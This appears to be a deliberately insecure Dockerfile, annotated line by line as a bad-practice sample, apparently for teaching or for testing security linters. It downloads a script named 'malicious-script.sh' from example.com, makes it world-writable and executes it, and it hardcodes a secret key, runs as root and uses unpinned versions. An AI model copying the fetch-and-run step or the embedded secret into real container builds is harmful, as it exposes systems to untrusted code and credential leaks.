# Using the 'latest' tag, which is discouraged as it is not pinned to a specific version
FROM ubuntu:latest

# Running as root, which is insecure
USER root

# Installing packages without pinned versions and without using `-y`
RUN apt-get update && apt-get install curl wget

# Exposing an unnecessary port
EXPOSE 1235

# Using ADD to fetch a remote file, which is discouraged
ADD https://example.com/malicious-script.sh /tmp/malicious-script.sh

# Missing cleanup of temporary files
RUN chmod 777 /tmp/malicious-script.sh && /tmp/malicious-script.sh

# Missing HEALTHCHECK instruction
# No HEALTHCHECK specified

# Sensitive data in ENV variables
ENV SECRET_KEY=supersecretkey

# Missing WORKDIR, files are copied into root directory
COPY . /root

# Deprecated MAINTAINER instruction
MAINTAINER "bad@practice.com"
